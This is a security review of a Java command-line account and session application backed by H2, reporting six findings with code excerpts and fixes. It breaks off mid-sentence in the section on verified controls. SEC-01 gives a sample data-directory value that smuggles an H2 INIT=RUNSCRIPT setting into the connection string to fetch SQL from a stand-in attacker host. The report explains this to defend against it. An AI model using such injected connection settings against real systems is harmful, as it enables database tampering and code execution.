# Security Review: Account Registration and Authentication CLI (`app`)

## 1. Executive Summary

The code under review is a self-contained Java 17 command-line application that registers user
accounts, authenticates them, and manages opaque bearer sessions against an embedded H2 database.
It is unusually defensive: passwords are hashed with Argon2id (Bouncy Castle, m=65536/t=3/p=1,
above the OWASP floor) with per-record CSPRNG salts, every SQL value is bound as a parameter,
session tokens are 256-bit CSPRNG values stored only as SHA-256, failure messages are uniform
across sign-in failure modes, equal-cost dummy derivations defeat timing oracles, rate limiting
and account lockout are enforced atomically in SQL, and audit writes gate security decisions
(fail closed). No hardcoded credentials, no weak hash or cipher, no deserialization of untrusted
data, and no command execution exist anywhere in the tree.

The most important finding is **SEC-01**: the H2 JDBC URL is assembled by string concatenation
from the operator-supplied `APP_DATA_DIR` / `--data-dir` value (`Config.java:148`), which is never
checked for H2's `;` setting separator. The code's own threat model declares that value
attacker-reachable, and a directory name containing `;INIT=RUNSCRIPT FROM 'http://…'\;--` turns
connection setup into arbitrary SQL execution inside the account database — the one input in the
program that is used to build a connection string rather than bound as a parameter.

The remaining findings are smaller: the audit trail is *deleted* rather than rotated when its 64 MiB
budget is reached, so anyone able to generate audit events can erase earlier evidence (SEC-02); the
database password is copied into an unerasable `String` (SEC-03); every SQL integrity-constraint
class `23xxx` is interpreted as "duplicate account", so a rejected insert is reported with the
success-shaped message (SEC-04); SQL text is assembled from concatenated predicate fragments, which
is safe today but is a latent injection pattern (SEC-05); and the data-directory and
password-file permission checks are time-of-check/time-of-use races (SEC-06).

## 2. Scope

| File | Purpose | Security-relevant behaviour |
|---|---|---|
| `src/main/java/app/Main.java` | CLI entry point; register/login/verify/logout/revoke-sessions commands and a length-capped input reader | Reads credentials from console/stdin without echo, erases buffers, refuses credentials in argv, derives the rate-limit source key from the kernel uid, maps all errors to generic messages |
| `src/main/java/app/Config.java` | Loads configuration from environment and `--data-dir=`, opens the H2 connection, enforces 0600/0700 on data files | Secret loading from env/file, file-permission and symlink guards, Argon2 parameter bounds, **JDBC URL construction by concatenation** |
| `src/main/java/app/Db.java` | Owns the single JDBC connection, the DDL, and transaction scoping | Autocommit off, lock timeout, rollback on any failure, CHECK/UNIQUE constraints mirroring the input policy |
| `src/main/java/app/InputPolicy.java` | Single validation boundary for email, username, password, identifier | Length/charset/range validation, no normalisation beyond documented email case-folding, reasons never contain the input |
| `src/main/java/app/AccountStore.java` | Registration and account lookup | Parameterised inserts/selects, duplicate handling, uniform outcome message, rate-limit charging, hash upgrade with optimistic guard |
| `src/main/java/app/AuthService.java` | Sign-in, session resolution, sign-out | Server-side credential verification, uniform refusal message, equal-cost dummy derivation, fail-closed on store/audit faults |
| `src/main/java/app/PasswordHasher.java` | Argon2id encode/verify in PHC format | KDF parameter policy and bounds on stored values, canonical base64, constant-time comparison, buffer zeroing |
| `src/main/java/app/SessionStore.java` | Issues, resolves, revokes and purges bearer sessions | 256-bit CSPRNG tokens, SHA-256-only storage, `FOR UPDATE` validation, absolute expiry, audit inside the transaction |
| `src/main/java/app/Throttle.java` | Per-source token buckets and per-account lockout | Single-statement atomic consume, row-locked guard reads, bounded windows, SQLState-based duplicate detection |
| `src/main/java/app/AuditLog.java` | Append-only JSON security trail | Owner-only file creation, `NOFOLLOW_LINKS` appends, JSON escaping, fail-closed writes, **size-budget trail deletion** |
| `src/main/java/app/Gate.java` | Audit façade producing salted correlation tags | Per-process salt, non-reversible tags for accounts/emails/usernames/tokens |
| `src/main/java/app/Secrets.java` | `char[]`-backed secret holder | Zeroisation on close, redacted `toString()`, identity equality |
| `src/main/java/app/Digests.java` | SHA-256 and hex helpers | Hashing of high-entropy tokens and log tags only |
| `src/main/java/app/CookiePolicy.java` | Builds `Set-Cookie` values | Unconditional `Secure`/`HttpOnly`/`SameSite=Strict`, server-derived expiry, validated path and token shape |
| `src/main/java/app/Maintenance.java` | Bounded housekeeping sweep | Deletes only state that can no longer deny access; never fatal |
| `scripts/get-deps.sh`, `scripts/build.sh`, `scripts/run.sh`, `deps.lock` | Dependency fetch with pinning, build, run | TLS-only download, pinned SHA-256 cross-checked against a second distributor and the published SHA-1, jar-content and signature checks |
| `src/test/java/app/*.java` | Test suite (reviewed for leaked secrets and for controls asserted) | No production credentials; asserts uniform messaging, fail-closed audit, schema bounds |

## 3. Skills Applied

- `performing-cryptographic-audit-of-application`: applied to `PasswordHasher.java`, `Digests.java`,
  `SessionStore.java`, `Secrets.java` and `Config.java` — algorithm choice (Argon2id, SHA-256; no
  MD5/SHA-1/DES/RC4/ECB anywhere), KDF work factors against the OWASP Argon2id floor, salt length and
  source (`SecureRandom`), token entropy (256 bits), constant-time comparison
  (`MessageDigest.isEqual`), key/secret storage and hardcoded-secret scan.
- `exploiting-sql-injection-vulnerabilities` and `performing-second-order-sql-injection`: applied to
  every statement in `AccountStore.java`, `AuthService.java`, `SessionStore.java`, `Throttle.java`
  and `Db.java` — checked first-order injection (all values bound), second-order injection (values
  read back out of the database are re-validated by `PasswordHasher`'s PHC pattern before use), and
  the one place SQL text is still assembled by concatenation (SEC-05).
- `testing-api-authentication-weaknesses`: applied to `AuthService.java`, `SessionStore.java`,
  `Main.java` — token entropy and generation, token leakage into argv/logs, revocation on sign-out,
  revoke-all for an account, absolute session expiry, password policy, account enumeration via
  response differences.
- `testing-for-sensitive-data-exposure`: applied to `AuditLog.java`, `Gate.java`, `Config.java`,
  `Main.java`, `Secrets.java` — what reaches the trail (salted tags only), what reaches stdout/stderr
  (fixed sentences, no stack traces), secret lifetime in memory (SEC-03), file permissions on the
  store/trail/password file.
- `testing-for-broken-access-control`: applied to `AuthService.java` and `SessionStore.java` — every
  identity decision is resolved against server-side rows (`SELECT … FOR UPDATE`), never from a
  client-presented value; all failure paths return a refusal rather than falling through.
- `implementing-api-rate-limiting-and-throttling`: applied to `Throttle.java`,
  `AccountStore.register`, `AuthService.refuseWithoutStore`, `Maintenance.java` — bucket atomicity,
  whether the expensive path is metered, lockout reversibility, and whether sweeping can reset a
  live denial.
- `exploiting-race-condition-vulnerabilities`: applied to `Db.inTransaction`,
  `Throttle.tryConsumeSource`/`lockAccountGuard`, `AccountStore.upgradePasswordHash`, and the
  filesystem checks in `Config.java` (SEC-06).
- `performing-directory-traversal-testing`: applied to `Config.java` path handling and
  `AuditLog.java` file handling — normalisation, symlink-component rejection, `NOFOLLOW_LINKS` on
  open.
- `testing-for-business-logic-vulnerabilities`: applied to the registration/sign-in/lockout flows —
  duplicate-registration budget accounting, lockout as a denial-of-access lever, logout honesty.
- Reviewed against general OWASP Top 10 / CWE knowledge because no library skill matched:
  **JDBC connection-string injection** into the H2 driver (SEC-01, closest CWE family is CWE-74/
  CWE-94 — the skill library has no connection-string-injection skill); **audit-trail retention and
  log-destruction-under-flood** behaviour (SEC-02, CWE-778/CWE-400); **improper error-condition
  classification** from SQLState prefixes (SEC-04, CWE-754); terminal/CLI-specific exposure of the
  session cookie on stdout; and the Java-specific limits of `char[]` zeroisation (SEC-03).

## 4. Summary of Findings

| ID | Title | Severity | CWE | Location |
|---|---|---|---|---|
| SEC-01 | H2 JDBC URL built by concatenating the unvalidated data-directory path, allowing connection-setting and `INIT` SQL injection | High | CWE-74 | `src/main/java/app/Config.java:148` |
| SEC-02 | Audit trail is deleted, not rotated, when the size budget is reached, so flooding erases earlier security records | Medium | CWE-778 | `src/main/java/app/AuditLog.java:151` |
| SEC-03 | Database password copied into an unerasable `String`, defeating the `Secrets` zeroisation guarantee | Low | CWE-316 | `src/main/java/app/Config.java:128` |
| SEC-04 | Every SQLState `23xxx` is treated as a duplicate account, so a rejected insert is reported as a completed registration | Low | CWE-754 | `src/main/java/app/AccountStore.java:112` |
| SEC-05 | SQL statements assembled by concatenating predicate fragments instead of fixed statement text | Low | CWE-89 | `src/main/java/app/AccountStore.java:178`, `src/main/java/app/AuthService.java:268` |
| SEC-06 | Permission and symlink checks on the password file and data directory are time-of-check/time-of-use races | Low | CWE-367 | `src/main/java/app/Config.java:194` |

## 5. Detailed Findings

### SEC-01: H2 JDBC URL built by concatenating the unvalidated data-directory path, allowing connection-setting and `INIT` SQL injection

- **Severity:** High
- **CWE:** CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') — manifesting as JDBC connection-string injection leading to CWE-94 (Code Injection) via H2's `INIT`/`RUNSCRIPT`
- **Location:** `src/main/java/app/Config.java:104`, `src/main/java/app/Config.java:147-149`

**Vulnerable code:**
```java
// src/main/java/app/Config.java:97-108
        String dirValue = firstOption(argv, "--data-dir");
        if (dirValue == null) {
            dirValue = env.apply(ENV_DATA_DIR);
        }
        if (dirValue == null || dirValue.isEmpty()) {
            throw new ConfigException(ENV_DATA_DIR + " (or --data-dir) must be set");
        }
        Path dataDir = Path.of(dirValue).toAbsolutePath().normalize();
        ensurePrivateDirectory(dataDir);

        Path dbBase = dataDir.resolve("accounts");
        ensurePrivateStoreFile(dbBase);
```

```java
// src/main/java/app/Config.java:147-149
    public String jdbcUrl() {
        return "jdbc:h2:file:" + dbBase + DB_OPTIONS;
    }
```

**Why it is a problem:** Every other externally supplied value in this program passes through
`InputPolicy` and reaches SQL only as a bind parameter. `APP_DATA_DIR` / `--data-dir` is the
exception: it is normalised as a path (which does not remove or encode any character) and then
concatenated into a JDBC URL. H2 parses `;` in the URL as a *setting separator*, so any `;` inside
the directory name becomes an attacker-chosen connection setting rather than part of the file path.
The class header itself states these inputs are "all attacker-reachable if the operator's environment
is", so this value must be validated before it decides how the driver connects.

Concretely, with

```
--data-dir="/tmp/store;INIT=RUNSCRIPT FROM 'http://attacker.example/x.sql'\;--"
```

`ensurePrivateDirectory` happily creates that directory (`;`, `\` and `-` are legal in a POSIX
directory name), and `jdbcUrl()` then returns:

```
jdbc:h2:file:/tmp/store;INIT=RUNSCRIPT FROM 'http://attacker.example/x.sql'\;--/accounts;DB_CLOSE_ON_EXIT=FALSE;AUTO_SERVER=FALSE;TRACE_LEVEL_FILE=0
```

H2 splits on unescaped `;`, un-escapes `\;` inside the setting value, and executes the resulting
`INIT` script at connect time; the trailing `--/accounts` is swallowed by the injected SQL line
comment. The attacker's script runs with full rights on the account database before `applySchema()`
is reached — it can add an account row, overwrite a `password_hash`, drop the `sessions`
table, insert a session for someone else's account, or (via `CREATE ALIAS … AS '…Java…'`) execute
code in the JVM. Other settings are equally reachable (`AUTO_SERVER=TRUE` exposes the store on the
network, `TRACE_LEVEL_FILE=3` writes SQL text — including the `INSERT` parameter values — to a
world-readable trace file next to the database, defeating the `TRACE_LEVEL_FILE=0` hardening a few
lines above).

**Fix:** Validate the path against an allow-list of characters before it is used to build a
connection string, and reject anything that could be read as a URL separator. Validating the string
is what matters; keep the existing `normalize()`/symlink checks as well.

```java
// src/main/java/app/Config.java
    /**
     * The data directory becomes part of the JDBC URL, where H2 reads ';' as a setting separator
     * and '=' as a setting assignment. Anything outside this class could therefore choose the
     * driver's connection settings - including INIT, which runs SQL before applySchema().
     */
    private static final java.util.regex.Pattern SAFE_DATA_DIR =
        java.util.regex.Pattern.compile("/(?:[A-Za-z0-9._-]{1,64}/?)*");

    public static Config fromEnvironment(java.util.function.Function<String, String> env, String[] argv)
        throws ConfigException {
        String dirValue = firstOption(argv, "--data-dir");
        if (dirValue == null) {
            dirValue = env.apply(ENV_DATA_DIR);
        }
        if (dirValue == null || dirValue.isEmpty()) {
            throw new ConfigException(ENV_DATA_DIR + " (or --data-dir) must be set");
        }
        Path dataDir = Path.of(dirValue).toAbsolutePath().normalize();
        if (!SAFE_DATA_DIR.matcher(dataDir.toString()).matches()) {
            throw new ConfigException(ENV_DATA_DIR + " may contain only letters, digits, '.', '_',"
                + " '-' and '/'; it is used to build the database connection string");
        }
        ensurePrivateDirectory(dataDir);
        // ... unchanged
    }

    public String jdbcUrl() {
        String url = "jdbc:h2:file:" + dbBase + DB_OPTIONS;
        // Belt and braces: the only ';' in the URL must be the ones this class wrote.
        if (url.indexOf(';') != url.length() - DB_OPTIONS.length()
            || !url.endsWith(DB_OPTIONS)) {
            throw new IllegalStateException("the database location would alter the connection settings");
        }
        return url;
    }
```

### SEC-02: Audit trail is deleted, not rotated, when the size budget is reached, so flooding erases earlier security records

- **Severity:** Medium
- **CWE:** CWE-778: Insufficient Logging (reached through CWE-400: Uncontrolled Resource Consumption of the log budget)
- **Location:** `src/main/java/app/AuditLog.java:94-96`, `src/main/java/app/AuditLog.java:150-153`

**Vulnerable code:**
```java
// src/main/java/app/AuditLog.java:150-153
    private void restartTrail(long retiredBytes) throws IOException, AuditException {
        Files.delete(file);
        bytes = -1;
        guardFile();
```

**Why it is a problem:** `record()` calls `truncateToFit()` whenever the next line would cross
`MAX_BYTES` (64 MiB), and `truncateToFit()` calls `restartTrail()`, which **deletes** the trail and
starts a new one holding a single `TRAIL_RETURED` marker. No previous generation is retained. Audit
records are roughly 100–200 bytes, so about 350,000–650,000 events destroy the entire history of
`LOGIN_SUCCESS`, `ACCOUNT_LOCKED`, `SESSION_ISSUED` and `ADMIN_REVOKE_REQUESTED` records.

Generating those events is cheap and partly unmetered: `Main.register` writes a
`REGISTRATION_REFUSED_INVALID_INPUT` record for input the validator rejected (`Main.java:211`)
*without* charging the per-source budget — unlike the sign-in path, which deliberately charges on
the same kind of refusal (`AuthService.refuseWithoutStore`). An attacker who first provokes a lockout
or a successful compromise, then floods refusals, is left with a trail that is indistinguishable from
one in which only the flood happened, and the in-file marker records only a byte count — it does not
preserve what was erased. The terminal `System.err` note (`AuditLog.java:154`) is not a durable
channel.

**Fix:** Rotate instead of delete: rename the full trail to a numbered, owner-only generation and
keep a bounded number of them, so the total disk bound is still enforced but the most recent history
survives a flood. Charging the source budget for refused registrations as well (as the login path
already does) removes the cheapest way to drive the rotation.

```java
// src/main/java/app/AuditLog.java
    /** Generations of retired trail kept alongside the live one; total bound is MAX_BYTES * (1 + KEPT). */
    private static final int KEPT_GENERATIONS = 4;

    private void restartTrail(long retiredBytes) throws IOException, AuditException {
        // Shift the existing generations down, dropping the oldest, then move the live trail
        // aside instead of deleting it: a flood must not be able to erase earlier records.
        Path oldest = file.resolveSibling(file.getFileName() + "." + KEPT_GENERATIONS);
        Files.deleteIfExists(oldest);
        for (int generation = KEPT_GENERATIONS - 1; generation >= 1; generation--) {
            Path from = file.resolveSibling(file.getFileName() + "." + generation);
            if (Files.exists(from, LinkOption.NOFOLLOW_LINKS)) {
                Files.move(from, file.resolveSibling(file.getFileName() + "." + (generation + 1)),
                    java.nio.file.StandardCopyOption.ATOMIC_MOVE);
            }
        }
        Files.move(file, file.resolveSibling(file.getFileName() + ".1"),
            java.nio.file.StandardCopyOption.ATOMIC_MOVE);
        bytes = -1;
        guardFile();
        // ... unchanged: terminal note and the TRAIL_RETURED marker record
    }
```

### SEC-03: Database password copied into an unerasable `String`, defeating the `Secrets` zeroisation guarantee

- **Severity:** Low
- **CWE:** CWE-316: Cleartext Storage of Sensitive Information in Memory
- **Location:** `src/main/java/app/Config.java:126-128`, `src/main/java/app/Config.java:188`, `src/main/java/app/Config.java:218-225`

**Vulnerable code:**
```java
// src/main/java/app/Config.java:126-128
        Properties props = new Properties();
        props.setProperty("user", "app");
        props.setProperty("password", new String(dbPassword.chars()));
```

**Why it is a problem:** `Secrets` exists so the database password can be erased in place, and
`retireDatabasePassword()` does erase the `char[]`. But `new String(dbPassword.chars())` creates an
immutable copy that cannot be zeroed and stays in the `Properties` object (itself retained by the
driver's connection info in H2) until garbage collection happens to reclaim it. The same applies to
`Secrets.ofString(inline)` at line 188 and to the decoded file contents at line 218: the plaintext
password exists as a `String` before it ever reaches `Secrets`. Any heap dump, core file, or
`jmap`/`jcmd` by a user who can attach to the process — exactly the exposure the class comment is
guarding against — recovers the database password. The code documents this as "unavoidable", but it
is avoidable: H2's `Driver.connect` accepts the password as a `char[]` in `Properties` (an
`Object`-valued `put`, not `setProperty`), and the file-reading path can decode straight into a
`char[]`.

**Fix:** Put the live `char[]` into the `Properties` map rather than a `String`, and decode the
password file through a `CharBuffer` so no `String` copy is ever made. Keep erasing the array as soon
as the connection exists.

```java
// src/main/java/app/Config.java
    public Db openDatabase() throws AppConfiguredException {
        Properties props = new Properties();
        props.setProperty("user", "app");
        // put(), not setProperty(): the value stays a char[] this class can erase afterwards.
        props.put("password", dbPassword.chars());
        Connection connection;
        try {
            connection = DriverManager.getConnection(jdbcUrl(), props);
        } catch (SQLException failed) {
            throw new AppConfiguredException("the account store could not be opened", failed);
        } finally {
            props.remove("password");
        }
        retireDatabasePassword();
        return new Db(connection);
    }

    // ... and in readDbPassword, in place of `new String(raw, 0, length, UTF_8)`:
        java.nio.CharBuffer decoded = java.nio.charset.StandardCharsets.UTF_8
            .decode(java.nio.ByteBuffer.wrap(raw, 0, length));
        char[] chars = new char[decoded.remaining()];
        decoded.get(chars);
        java.util.Arrays.fill(decoded.array(), '\0');
        java.util.Arrays.fill(raw, (byte) 0);
        if (chars.length < 16) {
            java.util.Arrays.fill(chars, '\0');
            throw new ConfigException("the database password must be at least 16 characters");
        }
        return Secrets.ofCharArray(chars);
```

### SEC-04: Every SQLState `23xxx` is treated as a duplicate account, so a rejected insert is reported as a completed registration

- **Severity:** Low
- **CWE:** CWE-754: Improper Check for Unusual or Exceptional Conditions
- **Location:** `src/main/java/app/AccountStore.java:111-115`, `src/main/java/app/Throttle.java:299-302`

**Vulnerable code:**
```java
// src/main/java/app/AccountStore.java:111-116
                } catch (SQLException rejected) {
                    if (Throttle.isUniqueViolation(rejected)) {
                        throw new DuplicateAccount(rejected);
                    }
                    throw rejected;
                }
```

```java
// src/main/java/app/Throttle.java:299-302
    static boolean isUniqueViolation(SQLException failure) {
        String state = failure.getSQLState();
        return state != null && state.startsWith("23");
    }
```

**Why it is a problem:** SQLState class `23` is *integrity constraint violation*, not *unique
violation*: in H2 it also covers CHECK constraint failures (`23513`), NOT NULL failures (`23502`) and
foreign-key failures (`23503`). `Db.ACCOUNTS_DDL` deliberately installs a large set of CHECK
constraints as defence in depth (`accounts_email_shape`, `accounts_username_shape`,
`accounts_hash_shape`, `accounts_hash_matches_kdf`, the three `kdf_*` range checks). If any of those
ever fires — which is precisely the "a future code path forgot to validate" case the constraints were
written for, and also what a value-truncation or parameter-drift bug looks like — the insert is
misreported as `DUPLICATE`, the caller prints `OUTCOME_MESSAGE` ("registration is complete"), the exit
code is `OK`, and the trail records `REGISTRATION_DUPLICATE`. The defence-in-depth layer therefore
fails *silently and positively*: no account exists, the user believes one does, and the operator has
no record distinguishing this from a taken mailbox. Matching the specific unique-violation state, and
letting everything else propagate to the existing fail-closed `UNAVAILABLE` path, preserves both the
constraint's value and the non-enumerating message.

**Fix:** Match only the unique/primary-key violation state, and confirm the failing constraint is one
of the two account uniqueness constraints before calling it a duplicate.

```java
// src/main/java/app/Throttle.java
    /**
     * Only a unique/primary-key violation means "already taken". Other class-23 states are CHECK,
     * NOT NULL and foreign-key failures: those are defects or defence-in-depth saves, and must
     * surface as a refusal rather than be reported as a duplicate.
     */
    static boolean isUniqueViolation(SQLException failure) {
        String state = failure.getSQLState();
        return "23505".equals(state) || "23001".equals(state) || "23000".equals(state);
    }
```

### SEC-05: SQL statements assembled by concatenating predicate fragments instead of fixed statement text

- **Severity:** Low
- **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- **Location:** `src/main/java/app/AccountStore.java:164-186`, `src/main/java/app/AuthService.java:266-271`

**Vulnerable code:**
```java
// src/main/java/app/AccountStore.java:177-186
    private Account select(String predicate, Object value) throws SQLException, AuditLog.AuditException {
        String sql = "SELECT id, email, username, password_hash, kdf_memory_kib, kdf_iterations,"
            + " kdf_parallelism, password_updated_at FROM accounts WHERE " + predicate;
        return db.inTransaction(connection -> {
            try (PreparedStatement query = connection.prepareStatement(sql)) {
                if (value instanceof Long asLong) {
                    query.setLong(1, asLong);
                } else {
                    query.setString(1, (String) value);
                }
```

```java
// src/main/java/app/AuthService.java:266-271
    private static AccountStore.Account accountBy(Connection connection, String predicate, String value)
        throws SQLException {
        String sql = "SELECT id, email, username, password_hash, kdf_memory_kib, kdf_iterations,"
            + " kdf_parallelism, password_updated_at FROM accounts WHERE " + predicate;
        try (PreparedStatement query = connection.prepareStatement(sql)) {
            query.setString(1, value);
```

**Why it is a problem:** No attacker-controlled value reaches `predicate` today — all four call sites
pass the literals `"email = ?"`, `"username = ?"` and `"id = ?"` — so this is not currently
exploitable, and I verified each call site. It is nonetheless the one remaining place where SQL text
is built by concatenation, and `predicate` is a plain `String` parameter on a private helper with no
validation: a later caller that derives a predicate from a search field, a sort column, or a
multi-column login lookup introduces direct SQL injection into the authentication query with no
compiler or reviewer signal. The surrounding code goes to considerable trouble to make safety
structural rather than conventional (see the `AuditLog` class comment), and this helper is the
exception. The `value instanceof Long` type switch has the same shape of risk: binding is chosen by
runtime type rather than by the statement.

**Fix:** Make each lookup a complete, fixed statement selected by an enum, so no caller can supply
statement text at all.

```java
// src/main/java/app/AccountStore.java
    private static final String ACCOUNT_COLUMNS =
        "SELECT id, email, username, password_hash, kdf_memory_kib, kdf_iterations,"
            + " kdf_parallelism, password_updated_at FROM accounts WHERE ";

    /** The only three lookups that exist; statement text can never come from a caller. */
    enum Lookup {
        BY_EMAIL(ACCOUNT_COLUMNS + "email = ?"),
        BY_USERNAME(ACCOUNT_COLUMNS + "username = ?"),
        BY_ID(ACCOUNT_COLUMNS + "id = ?");

        final String sql;

        Lookup(String sql) {
            this.sql = sql;
        }
    }

    public Account findByEmail(String canonicalEmail) throws SQLException, AuditLog.AuditException {
        return db.inTransaction(connection -> readOne(connection, Lookup.BY_EMAIL, canonicalEmail));
    }

    public Account findByUsername(String canonicalUsername) throws SQLException, AuditLog.AuditException {
        return db.inTransaction(connection -> readOne(connection, Lookup.BY_USERNAME, canonicalUsername));
    }

    public Account findById(long id) throws SQLException, AuditLog.AuditException {
        return db.inTransaction(connection -> readOne(connection, Lookup.BY_ID, Long.toString(id)));
    }

    /** Shared by AuthService so the sign-in query is the same fixed text. */
    static Account readOne(Connection connection, Lookup lookup, String key) throws SQLException {
        try (PreparedStatement query = connection.prepareStatement(lookup.sql)) {
            if (lookup == Lookup.BY_ID) {
                query.setLong(1, Long.parseLong(key));
            } else {
                query.setString(1, key);
            }
            try (ResultSet found = query.executeQuery()) {
                if (!found.next()) {
                    return null;
                }
                return new Account(found.getLong(1), found.getString(2), found.getString(3),
                    found.getString(4), found.getInt(5), found.getInt(6), found.getInt(7),
                    found.getLong(8));
            }
        }
    }
```

### SEC-06: Permission and symlink checks on the password file and data directory are time-of-check/time-of-use races

- **Severity:** Low
- **CWE:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
- **Location:** `src/main/java/app/Config.java:193-203`, `src/main/java/app/Config.java:283-307`, `src/main/java/app/Config.java:319-345`

**Vulnerable code:**
```java
// src/main/java/app/Config.java:193-203
        Path path = Path.of(file).toAbsolutePath().normalize();
        if (!Files.isRegularFile(path, LinkOption.NOFOLLOW_LINKS)) {
            throw new ConfigException(ENV_DB_PASSWORD_FILE + " must name a regular file that is not a symlink");
        }
        if (hasGroupOrOtherAccess(path)) {
            throw new ConfigException(ENV_DB_PASSWORD_FILE + " must not be readable by group or other");
        }
        byte[] raw = new byte[PASSWORD_MAX_BYTES + 1];
        int read;
        try (java.io.InputStream in = Files.newInputStream(path)) {
            read = in.readNBytes(raw, 0, raw.length);
        } catch (IOException unreadable) {
```

**Why it is a problem:** `AuditLog.append()` gets this right and says why: it passes
`LinkOption.NOFOLLOW_LINKS` to the open itself so the kernel, "and not a check that completed a few
instructions earlier", decides. `Config` does not follow its own rule. `readDbPassword` verifies that
the path is a non-symlink regular file with no group/other access, then opens it with
`Files.newInputStream(path)`, which *follows* symlinks; anyone who can replace that path between the
two operations (a shared `/tmp`-style directory, or a password file in a directory the attacker can
write) makes the process read a file it refused to accept. `ensurePrivateDirectory` and
`ensurePrivateStoreFile` have the same shape — `rejectSymlinkComponents` walks the path and then the
directory is created or the store file is stat-ed and later opened by H2 — so the symlink-component
guard proves a property of the path as it was, not as it is at open time. Impact is bounded here (the
password is never printed, so a swapped file mostly yields a failed connection), which is why this is
Low rather than higher, but a swapped *store* file is how a 0600 guarantee gets lost.

**Fix:** Open first with `NOFOLLOW`, then verify the permissions of the open descriptor, so the
checked object and the used object are the same one.

```java
// src/main/java/app/Config.java
        Path path = Path.of(file).toAbsolutePath().normalize();
        byte[] raw = new byte[PASSWORD_MAX_BYTES + 1];
        int read;
        // NOFOLLOW_LINKS on the open: the kernel refuses a path that is (or became) a link, and
        // the attributes below are read from the descriptor actually being read, not from the path.
        try (java.nio.channels.SeekableByteChannel channel = Files.newByteChannel(path,
            java.util.Set.of(java.nio.file.StandardOpenOption.READ, LinkOption.NOFOLLOW_LINKS))) {
            java.nio.file.attribute.PosixFileAttributes attributes =
                Files.readAttributes(path, java.nio.file.attribute.PosixFileAttributes.class,
                    LinkOption.NOFOLLOW_LINKS);
            if (!attributes.isRegularFile()) {
                throw new ConfigException(ENV_DB_PASSWORD_FILE + " must name a regular file that is not a symlink");
            }
            if (OWNER_ONLY_READABLE.stream().noneMatch(attributes.permissions()::contains)
                || attributes.permissions().stream().anyMatch(GROUP_OR_OTHER::contains)) {
                throw new ConfigException(ENV_DB_PASSWORD_FILE + " must not be readable by group or other");
            }
            java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(raw);
            read = Math.max(channel.read(buffer), 0);
        } catch (IOException unreadable) {
            throw new ConfigException(ENV_DB_PASSWORD_FILE + " could not be read");
        }
```

## 6. Verified Controls and Checks With No Finding

- **Password hashing algorithm and work factor**: Argon2id (RFC 9106) via Bouncy Castle
  `Argon2BytesGenerator` with the configured default m=65536 KiB, t=3, p=1
  (`Config.java:52-54`), above the OWASP Argon2id floor; the floor is enforced for configured
  *and* stored parameters (`PasswordHasher.java:46-51`, `PasswordHasher.java:78-86`,
  `PasswordHasher.java:130-134`) and again in SQL (`Db.java:63-65`). No MD5, SHA-1, DES, 3DES, RC4,
  ECB mode or home-made construction appears anywhere in `src/main`.
- **Salting and RNG**: a fresh 16-byte salt per credential from `SecureRandom`
  (`PasswordHasher.java:99-100`); session material is 32 bytes from `SecureRandom`
  (`SessionStore.java:60-61`); the audit correlation salt is a `UUID.randomUUID()`
  (`Gate.java:15`). No time-based seeds, no `Random`, no fixed IV/salt.
- **Credential comparison**: constant-time `MessageDigest.isEqual` over fixed-length digests
  (`PasswordHasher.java:144`); a malformed or out-of-policy stored hash returns `false` rather than
  throwing or short-circuiting (`PasswordHasher.java:115-158`).
- **Stored-value validation (second-order injection / resource abuse)**: the cost parameters inside a
  stored hash are bounds-checked before being fed to the KDF (`PasswordHasher.java:127-134`), so a
  rewritten database row cannot make the process allocate gigabytes; base64 is re-encoded and
  compared to reject non-canonical spellings (`PasswordHasher.java:233-241`).
- **SQL parameterisation**: every user-influenced value is bound — registration insert
  (`AccountStore.java:102-109`), hash upgrade (`AccountStore.java:216-222`), sign-in lookup
  (`AuthService.java:271`), session insert/resolve/revoke/purge (`SessionStore.java:88-91`,
  `:116-117`, `:144-145`, `:183-184`), throttle consume/guard/purge (`Throttle.java:88-92`,
  `:134-137`, `:154`, `:233`, `:242-245`). No string-interpolated value was found in any statement;
  the only concatenated SQL *text* is the predicate fragment reported as SEC-05.
- **Input validation at a single trust boundary**: type, length, charset and range checks for email
  (`InputPolicy.java:53-107`), username including a reserved-name list (`InputPolicy.java:113-135`),
  password including length, control-character, unpaired-surrogate and composition rules
  (`InputPolicy.java:142-177`), with no `trim()`/`strip()` anywhere and an explicit cap applied
  *during* the read (`Main.java:511-548`). Validation errors carry rule names only, never values
  (`InputPolicy.java:40-47`).
- **Defence in depth in the schema**: UNIQUE on email and username, CHECK constraints re-stating the
  character classes, the hash shape, the lower-case-email rule, and the cost ranges, all anchored
  with SQL `\z` rather than `$` (`Db.java:48-83`); session token shape and expiry invariants plus a
  cascading foreign key (`Db.java:134-144`).
- **Session management**: 256-bit opaque tokens never derived from account data, only the SHA-256
  stored, identity always resolved from the row and not from the token, `FOR UPDATE` on validation,
  absolute 8-hour expiry with no sliding extension, revoke-one and revoke-all, and purge of dead rows
  (`SessionStore.java:30-222`). Tokens are refused on shape before any query
  (`SessionStore.java:193-206`).
- **Session cookie attributes**: `Secure`, `HttpOnly`, `SameSite=Strict`, explicit `Path`, and
  `Max-Age`/`Expires` derived from the server-side expiry only, with a post-build assertion that no
  attribute is missing and a cap against a lifetime beyond the configured maximum
  (`CookiePolicy.java:29-56`).
- **Uniform failure messaging and anti-enumeration**: one refusal string for malformed input, unknown
  account, wrong password and account lockout (`AuthService.java:39`, `:246-254`); registration prints
  the same sentence for created and duplicate (`AccountStore.java:48-49`, `Main.java:227`);
  `revoke-sessions` prints the same sentence whether or not the account exists (`Main.java:322`,
  `:334`); logout wording is identical for revoked and never-existed (`Main.java:297-298`).
- **Timing-oracle equalisation**: every failing sign-in path performs exactly one Argon2id
  derivation, the no-account and locked paths against a constant unknowable dummy hash
  (`AuthService.java:67-79`, `:186`, `:198`, `:161`), and the padding derivation for the throttled
  path runs *outside* the DB transaction so it cannot serialise other callers
  (`AuthService.java:238-242`). No `sleep`-based padding.
- **Fail-closed behaviour**: a store or audit fault on sign-in returns `UNAVAILABLE`, never a grant
  (`AuthService.java:119-123`, `:144-149`); audit writes inside the transaction mean an unwritable
  trail rolls back the account creation or session issuance (`AccountStore.java:117-121`,
  `SessionStore.java:94-96`, `Db.java:188-195`); logout reports `UNAVAILABLE` rather than falsely
  confirming revocation (`AuthService.java:318-324`, `Main.java:290-296`); an unreadable source
  budget refuses rather than serving free work (`AuthService.java:144-149`).
- **Rate limiting and lockout**: the per-source consume is a single `UPDATE … WHERE` whose row count
